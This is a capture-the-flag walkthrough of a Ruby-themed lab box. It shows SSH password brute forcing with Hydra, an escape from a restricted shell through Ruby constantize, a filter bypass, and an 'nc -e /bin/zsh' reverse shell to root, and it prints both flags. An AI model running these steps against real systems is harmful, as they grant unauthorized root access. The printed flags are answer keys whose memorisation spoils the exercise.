> Red Stone Once Carat | Ruby

Start with SSH bruteforce on user noraj.

# Nmap

nmap -sC -sV -T4 -A -vv -Pn $IP -oN nmap/initial

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:e7:f2:f6:74:65:a6:dd:f2:94:cd:45:fd:f3:2b:2a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHVsUg1GJYLWn/T/EkTfAMV4tdmLEiJvPP4cCCbx7hFt3ma0FAQpMMAoXFP12+hePBYXwJfMv1epkGg0+ur9VZRSfudeSjfR+pVuPE+LjuKU8v02Fo3Wi9xkV2rOuqGkXz09xxI34OwWka/JXFYe/MEXNWCMlSYtWUx+kiOQLG83x7t9rPxXuJ4KBsCnFRm2tEgoW0M3L/PX/97bLRu/A2clOnmyPsL1kwU4MBN3UZkQJCptM+EkqQqo8NMOlw3Sa6JnpGImHdSMBrGUoFo6yL+3i+KMR3foIVbW8WtTY+EKfaDt0e5MAhT1YLgZHdkR58Dh0kPoVRk59iw2divYll
|   256 34:a3:16:aa:b3:1f:83:ac:91:a3:31:b4:45:94:3c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJf9gbS/xBNED4k9vQscQ6Xi4VMzkK2MuFW0YJs5OQ854rlmaELtcwjEIZ9o+2SOVXwx8vH101rlIFQC0pISFP0=
|   256 75:23:c0:66:c7:2c:6e:12:0a:f7:04:61:2b:c6:12:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7ai11Zz/i/bAw8SQG0aBJfcYjdIiQQiAXhV8/9b3km
```

**Hint: The password contains "bu".**

Let's extract those passwords from rockyou.txt

# Cracking password using Hydra

hydra -l noraj -P passwords.txt ssh://$IP

```bash
[22][ssh] host: 10.10.166.33   login: noraj   password: cheeseburger
```

We are in as noraj but can't execute any commands. Let's see waht shell do we have.

```bash
echo $PATH
/home/noraj/bin
echo $SHELL
/bin/rzsh
```

So we have a restricted shell `rzsh`. Also we don't have `/bin`, `/usr/bin` or `/bin` in our path and we can't change the path too. We can't use ls but we can use echo.

```bash
echo *          
bin user.txt
echo bin/*          
bin/rzsh bin/test.rb
```

Looks like we can run `test.rb` and on running it we got the code.

test.rb

```ruby
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

Constantize method converts strings to Ruby objects which we can abuse to execeute commands or read files etc.
The above code requires args class, class method and argument. Let's try reading user.txt using class `File`, class method `Read()` and argument `/home/noraj/user.txt`.

test.rb File read '/home/noraj/user.txt' => But it didn't work for me. 

So I was trying to stabilise the shell and came across a NullByte Article of escaping restricted shells. For ruby `exec /bin/sh`. Since we are running zsh we can use `exec /bin/zsh`

test.rb Kernel exec '/bin/zsh'

Let's set the path to run commands. We can use ls but no cat, tac or head. Let's use ruby here.

```ruby
irb
irb(main):001:0> File.read('user.txt')
=> "THM{3a106092635945849a0fbf7bac92409d}"
```

We got a hidden .txt file too called `.hint.txt`

```ruby
irb(main):001:0> File.read('.hint.txt')
=> "Maybe take a look at local services."
```

We can't use both ss or netstat. We have a mini version of `ss -ta` in git. And let's b64 it and transfer it to the box.

```bash
(local)cat ss.rb | base64 -w 0
<BASE64 ENCODED STRING>
(remote)printf %s 'encoded_String' | base64 -d > /tmp/ss.rb
(remote)ruby /tmp/ss.rb

local address         remote address        state       username (uid)
127.0.0.53:53         0.0.0.0:0             LISTEN      systemd-resolve (101)
0.0.0.0:22            0.0.0.0:0             LISTEN      root (0)
127.0.0.1:31547       0.0.0.0:0             LISTEN      root (0) => This one looks promising
10.10.166.33:22       10.8.107.21:49494     ESTABLISHED root (0)
```

Let's examine port 31547.

nc 127.0.0.1 31547

And we got a shell. Wait not a shell we can't execute commands. Looks like it is Ruby pseudo eval shell. Let's try to read passwd file.

```bash
File.read('/etc/passwd')
Forbidden character
```

Looks like some characters are forbidden. We can use %x and curly braces {} rather than normal () or square braces []. Also we can replace 127.0.0.1 that is using dots but localhost. 

# Steps

1. Open up another SSH session
2. In Psuedo shell use `%x{nc -e /bin/zsh localhost 8888}`
3. In the 2nd ssh session use `nc -nlp 8888`. Now we got shell as root. 
4. Export path to execute commands. `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

# root.txt

```
THM{58e53d1324eef6265fdb97b08ed9aadf}
```